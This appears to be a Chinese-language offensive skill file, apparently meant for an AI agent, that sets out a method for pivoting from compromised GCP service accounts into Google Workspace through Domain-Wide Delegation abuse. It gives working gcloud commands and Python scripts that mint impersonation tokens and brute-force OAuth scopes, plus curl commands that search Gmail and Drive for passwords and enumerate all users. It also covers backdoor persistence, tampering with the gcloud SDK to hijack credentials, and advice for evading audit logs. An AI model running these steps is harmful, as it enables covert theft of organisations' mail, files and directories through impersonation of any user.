---
name: gcp-workspace-pivot
description: "GCP 到 Google Workspace 的穿越攻击方法论。当已获取 GCP Service Account 或 Project 权限并发现目标组织使用 Google Workspace、需要从云平台穿越到企业邮件/文档/管理控制台、或发现 Domain-Wide Delegation 配置时使用。覆盖 Domain-Wide Delegation 滥用、OAuth 范围利用、Workspace API 数据窃取（Gmail/Drive/Calendar/Admin Directory）、以及 Workspace 持久化技术"
metadata:
  tags: "gcp,google-workspace,gsuite,domain-wide-delegation,dwd,oauth,gmail,drive,calendar,admin-directory,穿越,Workspace攻击"
  category: "cloud"
---

# GCP 到 Google Workspace 穿越攻击方法论

GCP 与 Google Workspace 同属 Google Cloud 生态，二者通过 IAM 和 OAuth 深度绑定。当攻击者拿到 GCP Service Account 或 Project 权限后，若目标组织同时使用 Google Workspace（原 G Suite），就可能从云基础设施穿越到企业办公系统——直接访问全员邮件、文件、日历、通讯录乃至管理控制台。

**为什么这个穿越如此致命**：

- **影响面极大**：一个配置了 Domain-Wide Delegation（DWD）的 Service Account 可冒充组织内任意用户
- **权限升级无感知**：DWD 滥用不需要目标用户交互或确认，被冒充的用户完全无感
- **数据价值极高**：企业邮件（Gmail）、共享文件（Drive）、会议日程（Calendar）、组织架构（Admin Directory）全部可被访问
- **攻击路径隐蔽**：通过 Service Account 生成的 OAuth Token 访问 Workspace API，不同于用户直接登录，很多组织缺少对此类访问的监控

## 深入参考

识别到具体 Workspace 后渗透场景后，加载参考文档获取完整技术细节：

- Workspace 各服务后渗透操作（Gmail/Drive/Calendar/Admin Directory/Chat）与持久化技术 → 读 [references/workspace-post-exploit.md](references/workspace-post-exploit.md)

## 核心概念：Domain-Wide Delegation（DWD）

### DWD 是什么

Domain-Wide Delegation 是 Google Workspace 的一项功能，允许 GCP Service Account 代表 Workspace 域内的任意用户访问 Google API。其工作流程：

```
1. Service Account 使用私钥签署 JWT（声明要冒充的用户和请求的 OAuth scope）
2. JWT 发送到 Google OAuth 2.0 服务，请求 Access Token
3. Google 验证 DWD 配置后返回 Access Token（代表目标用户）
4. 使用该 Token 调用 Google API（Gmail/Drive/Calendar 等），以目标用户身份操作
```

### 为什么 DWD 危险

- 配置 DWD 时只需 Service Account 的 OAuth Client ID 和 OAuth Scope，**不绑定特定用户**
- 一旦配置，该 SA 可冒充**域内任意用户**，包括 Super Admin
- DWD 配置只能在 Admin Console 手动管理，**无法通过 API 审计**其历史变更
- 许多组织为了自动化工作流而配置 DWD，但未做最小权限限制

### DWD 滥用的前提条件

| 条件 | 说明 |
|------|------|
| 拥有 SA 私钥或可创建新密钥 | `iam.serviceAccountKeys.create` 权限 |
| SA 已配置 DWD | Admin Console 中已授权该 SA 的 Client ID |
| 知道至少一个有效 Workspace 用户邮箱 | 用于冒充，Super Admin 效果最佳 |
| SA 被授权了有用的 OAuth Scope | 如 Gmail、Drive、Admin Directory 等 |

## 攻击链：发现并利用 DWD

### Step 1：枚举 GCP 项目中的 Service Account

```bash
# 列出当前项目的所有 Service Account
gcloud iam service-accounts list --project <project-id>

# 枚举所有可访问项目
for proj in $(gcloud projects list --format="value(projectId)"); do
  echo "=== Project: $proj ==="
  gcloud iam service-accounts list --project "$proj" \
    --format="table(email,displayName,disabled)" 2>/dev/null
done
```

### Step 2：检查 SA 的密钥和权限

```bash
# 列出 SA 的现有密钥
gcloud iam service-accounts keys list \
  --iam-account <sa-email> \
  --format="table(name,validAfterTime,validBeforeTime,keyType)"

# 检查当前用户对 SA 的权限（能否创建密钥）
gcloud iam service-accounts get-iam-policy <sa-email>

# 创建新密钥（如有权限）
gcloud iam service-accounts keys create ./sa-key.json \
  --iam-account <sa-email>
```

### Step 3：识别 DWD 配置

DWD 配置无法通过 GCP API 直接查询，需要间接判断：

```bash
# 获取 SA 的 OAuth2 Client ID（唯一标识，用于 DWD 配置）
gcloud iam service-accounts describe <sa-email> \
  --format="value(oauth2ClientId)"

# 暴力尝试法：用 SA 密钥尝试生成委托令牌
# 如果成功，说明该 SA 已配置 DWD
```

**自动化发现**：使用 DeleFriend 工具可批量枚举所有 SA 并尝试各种 OAuth Scope 组合来发现 DWD 配置。

### Step 4：生成委托令牌并冒充用户

```python
from google.oauth2 import service_account
import google.auth.transport.requests

# 目标 OAuth Scope（根据需要选择）
SCOPES = [
    'https://www.googleapis.com/auth/gmail.readonly',
    'https://www.googleapis.com/auth/drive.readonly',
    'https://www.googleapis.com/auth/calendar.readonly',
    'https://www.googleapis.com/auth/admin.directory.user.readonly',
    'https://www.googleapis.com/auth/admin.directory.group.readonly',
]

# 加载 SA 凭据并设置委托用户
credentials = service_account.Credentials.from_service_account_file(
    'sa-key.json', scopes=SCOPES
)
# 冒充目标用户（Super Admin 效果最佳）
delegated_creds = credentials.with_subject('admin@target-org.com')

# 获取 Access Token
request = google.auth.transport.requests.Request()
delegated_creds.refresh(request)
print(f"Access Token: {delegated_creds.token}")
```

```bash
# 使用生成的 Token 调用 API
TOKEN="<上一步获取的 token>"

# 测试 Gmail 访问
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=5"

# 测试 Drive 访问
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/drive/v3/files?pageSize=10"
```

### Step 5：批量尝试 OAuth Scope

当不确定 SA 被授权了哪些 Scope 时，逐个尝试：

```python
"""批量尝试不同 OAuth Scope 组合，发现 SA 的 DWD 权限范围"""
from google.oauth2 import service_account
import google.auth.transport.requests

SCOPE_LIST = [
    'https://mail.google.com/',
    'https://www.googleapis.com/auth/gmail.readonly',
    'https://www.googleapis.com/auth/drive',
    'https://www.googleapis.com/auth/drive.readonly',
    'https://www.googleapis.com/auth/calendar',
    'https://www.googleapis.com/auth/calendar.readonly',
    'https://www.googleapis.com/auth/admin.directory.user',
    'https://www.googleapis.com/auth/admin.directory.user.readonly',
    'https://www.googleapis.com/auth/admin.directory.group',
    'https://www.googleapis.com/auth/admin.directory.domain',
    'https://www.googleapis.com/auth/cloud-platform',
    'https://www.googleapis.com/auth/contacts.readonly',
    'https://www.googleapis.com/auth/chat.messages.readonly',
]

for scope in SCOPE_LIST:
    try:
        creds = service_account.Credentials.from_service_account_file(
            'sa-key.json', scopes=[scope]
        )
        delegated = creds.with_subject('admin@target-org.com')
        delegated.refresh(google.auth.transport.requests.Request())
        print(f"[+] 有效 Scope: {scope}")
    except Exception as e:
        print(f"[-] 无效 Scope: {scope} ({e})")
```

## 决策树：GCP 权限 → Workspace 穿越路径

```
当前 GCP 权限级别？
├─ 拥有 SA 私钥文件
│   ├─ SA 已配置 DWD → 直接生成委托令牌冒充任意用户
│   └─ SA 未配置 DWD → 检查其他 SA / 尝试创建新 DWD（需 Workspace Admin）
│
├─ 可创建 SA 密钥（iam.serviceAccountKeys.create）
│   ├─ 枚举所有 SA → 为每个 SA 创建密钥 → 尝试 DWD
│   └─ 使用 DeleFriend 自动化枚举
│
├─ 拥有 Workspace Super Admin（通过 GCP 提权获得）
│   ├─ 创建新 SA + 配置 DWD → 完全控制 Workspace
│   └─ 直接通过 Admin Console 操作（不需 DWD）
│
├─ 普通 Workspace 用户凭据
│   ├─ 创建新 GCP 项目 → 启用 API → 枚举 Workspace
│   ├─ 加入开放的 Google Groups → 获取额外 GCP 权限
│   └─ gcloud auth login --enable-gdrive-access → 访问 Drive
│
└─ 仅有 GCP 项目 Viewer
    └─ 枚举 SA 列表 → 寻找可利用的 SA → 尝试提权路径
```

## OAuth Scope 利用速查

### 高价值 Scope 列表

| OAuth Scope | 能力 | 危险等级 |
|-------------|------|----------|
| `https://mail.google.com/` | Gmail 完全读写（含发送） | 极高 |
| `https://www.googleapis.com/auth/gmail.readonly` | 读取所有邮件 | 高 |
| `https://www.googleapis.com/auth/drive` | Drive 完全读写 | 极高 |
| `https://www.googleapis.com/auth/admin.directory.user` | 用户管理（创建/删除用户） | 极高 |
| `https://www.googleapis.com/auth/admin.directory.group` | 组管理 | 高 |
| `https://www.googleapis.com/auth/admin.directory.domain` | 域管理 | 极高 |
| `https://www.googleapis.com/auth/calendar` | 日历完全读写 | 中 |
| `https://www.googleapis.com/auth/contacts` | 通讯录读写 | 中 |
| `https://www.googleapis.com/auth/chat.messages` | Chat 消息读写 | 中 |
| `https://www.googleapis.com/auth/cloud-platform` | GCP 全权限 | 极高 |

### gcloud 凭据劫持

当物理访问到已登录 gcloud 的主机时，可以劫持已有凭据来访问 Workspace：

```bash
# 检查已认证的账户
gcloud auth list

# 使用 --enable-gdrive-access 重新登录，扩展 Scope 到 Drive
gcloud auth login --enable-gdrive-access

# 用获取的 Token 访问 Drive API
curl -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  "https://www.googleapis.com/drive/v3/files"
```

**高级手法**：修改 `google-cloud-sdk/lib/googlecloudsdk/core/config.py` 中的 `CLOUDSDK_SCOPES`，注入额外的 OAuth Scope（如 `https://www.googleapis.com/auth/drive`），下次用户登录时 Token 自动携带该 Scope。

## Workspace 数据窃取速查

→ 读 [references/workspace-post-exploit.md](references/workspace-post-exploit.md)

| 服务 | 关键 API | 典型操作 |
|------|----------|----------|
| Gmail | `gmail.googleapis.com/gmail/v1/users/me/messages` | 搜索/读取邮件，提取附件 |
| Drive | `www.googleapis.com/drive/v3/files` | 列出/下载文件，搜索敏感文档 |
| Calendar | `www.googleapis.com/calendar/v3/calendars` | 读取会议安排，查看参会人 |
| Admin Directory | `admin.googleapis.com/admin/directory/v1/users` | 枚举用户/组/域，修改角色 |
| Chat | `chat.googleapis.com/v1/spaces` | 读取 Chat 消息 |
| Contacts | `people.googleapis.com/v1/people/me/connections` | 获取通讯录 |

### 快速数据提取命令

```bash
TOKEN="<delegated_access_token>"

# Gmail：搜索含密码的邮件
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://gmail.googleapis.com/gmail/v1/users/me/messages?q=password+OR+credential+OR+密码"

# Drive：搜索敏感文件
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/drive/v3/files?q=name+contains+'password'+or+name+contains+'credential'&fields=files(id,name,mimeType)"

# Admin Directory：枚举所有用户
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://admin.googleapis.com/admin/directory/v1/users?domain=target-org.com&maxResults=500"

# Admin Directory：枚举所有组
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://admin.googleapis.com/admin/directory/v1/groups?domain=target-org.com"
```

## Workspace 持久化概览

| 技术 | 前置条件 | 隐蔽性 | 持久性 |
|------|----------|--------|--------|
| 创建新 DWD 配置 | Workspace Super Admin | 中 | 永久（直到手动删除） |
| 跨组织 DWD | 攻击者 GCP 账户 + 目标 Super Admin | 高 | 永久 |
| Gmail 转发规则 | 被冒充用户身份 | 低 | 持续（直到发现） |
| Gmail 过滤器隐藏告警 | 被冒充用户身份 | 高 | 持续 |
| OAuth App 授权 | 用户交互或 Admin 权限 | 中 | 直到撤销 |
| 委托邮箱访问 | 用户设置或 Admin 权限 | 中 | 直到撤销 |
| 创建后门管理员账户 | Admin Directory 写权限 | 低 | 直到发现 |
| App Script 定时触发 | 用户交互 | 高 | 持续 |
| 修改 gcloud SDK Scope | 主机物理/远程访问 | 高 | 直到 SDK 更新 |

**创建新 DWD 实现持久化**：

```bash
# 1. 在攻击者控制的 GCP 项目中创建 SA
gcloud iam service-accounts create backdoor-sa \
  --project <attacker-project>
gcloud iam service-accounts keys create backdoor-key.json \
  --iam-account backdoor-sa@<attacker-project>.iam.gserviceaccount.com

# 2. 获取 SA 的 OAuth Client ID
gcloud iam service-accounts describe \
  backdoor-sa@<attacker-project>.iam.gserviceaccount.com \
  --format="value(oauth2ClientId)"

# 3. 在目标 Workspace Admin Console 中添加 DWD
# https://admin.google.com/ac/owl/domainwidedelegation
# 填入 Client ID 和所需 OAuth Scope
# 注意：此步骤只能手动操作，无法通过 API 完成
```

**关键发现**：DWD 的 OAuth Client ID 是全局的，**跨组织 DWD** 是可行的——攻击者 GCP 项目的 SA 可以被配置为目标 Workspace 组织的委托身份。只需要目标 Workspace 的 Super Admin 访问权限即可完成配置。

## 推荐工具

| 工具 | 用途 | 链接/命令 |
|------|------|-----------|
| DeleFriend | 自动化 DWD 发现与利用 | `github.com/axon-git/DeleFriend` |
| DelePwn | DeleFriend 增强版，含域枚举/Drive/Gmail | `github.com/n0tspam/delepwn` |
| gcpwn | GCP 综合利用框架 | `github.com/NetSPI/gcpwn` |
| gcp_delegation.py | Gitlab 红队 DWD 利用脚本 | `gitlab.com/gitlab-com/gl-security/.../gcp_delegation.py` |
| gcp_gen_delegation_token | 生成委托 OAuth Token | `github.com/carlospolop/gcp_gen_delegation_token` |
| google-api-python-client | Google API Python SDK | `pip install google-api-python-client` |
| PaperChaser | Drive 文档蜘蛛爬取 | `github.com/mandatoryprogrammer/PaperChaser` |

## OPSEC 注意事项

### Workspace 审计日志

Google Workspace Admin Console 的审计日志会记录以下操作：

- **Admin 审计日志**：用户/组的创建、删除、权限变更
- **登录审计日志**：登录事件（但 SA 冒充**不产生**登录日志）
- **Drive 审计日志**：文件查看、下载、共享、权限变更
- **Gmail 审计日志**：委托访问、邮件规则变更
- **Token 审计日志**：OAuth Token 授权和撤销
- **SAML 审计日志**：SSO 相关事件

### 高危告警触发器

| 操作 | 告警级别 | 说明 |
|------|----------|------|
| 创建新 Admin 用户 | 高 | Admin 审计日志 + 邮件通知 |
| 新增 DWD 配置 | 中 | Admin 审计日志（但很多组织未监控） |
| 大量 API 调用 | 中 | 异常流量检测 |
| 跨地理位置 Token 使用 | 低 | SA Token 通常无地理限制 |
| Gmail 转发规则变更 | 高 | 安全告警推送到用户手机 |
| OAuth App 授权 | 中 | 取决于组织策略 |

### OPSEC 建议

- **冒充 SA 而非用户登录**：SA 通过 DWD 生成的 Token 不会触发用户登录告警
- **控制 API 调用速率**：避免短时间大量请求触发异常检测
- **优先使用只读 Scope**：`readonly` Scope 比读写 Scope 产生更少审计条目
- **选择冒充目标**：不一定要冒充 Super Admin，普通用户的操作更不易引起关注
- **Gmail 操作谨慎**：创建转发规则/过滤器会触发安全告警推送到用户手机

## 交叉引用

- 参考 `gcp-pentesting` 技能，获取 GCP 整体攻击流程和初始权限获取方法
- 参考 `gcp-exploit` 技能，获取 GCP 权限提升和 Service Account 相关利用技术
